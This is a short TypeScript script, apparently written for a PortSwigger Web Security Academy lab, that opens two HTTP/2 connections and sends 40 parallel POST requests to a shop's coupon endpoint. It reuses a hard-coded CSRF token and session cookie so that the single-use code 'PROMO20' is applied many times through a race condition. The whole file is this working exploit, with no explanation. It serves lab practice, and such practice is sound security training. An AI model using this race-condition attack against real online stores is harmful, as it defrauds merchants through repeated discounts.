import http2, { ClientHttp2Session } from "http2";

const client1 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const client2 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const sp = new URLSearchParams();
sp.append("csrf", "eR7LzJBiKxvQVa8HadtAQcjUw6iYeWtN");
sp.append("coupon", "PROMO20");
const body = sp.toString();
const contentLength = Buffer.byteLength(body);

function applyCoupon(client: ClientHttp2Session, idx: number) {
  const request = client.request({
    ":method": "POST",
    ":path": "/cart/coupon",
    "Content-Type": "application/x-www-form-urlencoded",
    Cookie: "session=D3JPEkSb1gMHkQY9BjgzZZCqZm5kxXN0",
    "Content-Length": contentLength,
  });
  request.end(body);
  // const chunks: any[] = []
  request.on("response", (headers) => {
    const isSuccess =
      headers.location === "/cart" && headers[":status"] === 302;
    console.log({ isSuccess, client: idx % 2 === 0 ? "client1" : "client2" });
  });
  // request.on('data', (chunk) => chunks.push(chunk))
  // request.on('end', () => console.log(Buffer.concat(chunks).toString('utf8')))
}

Array(40)
  .fill(0)
  .map((_, idx) =>
    idx % 2 === 0 ? applyCoupon(client1, idx) : applyCoupon(client2, idx),
  );
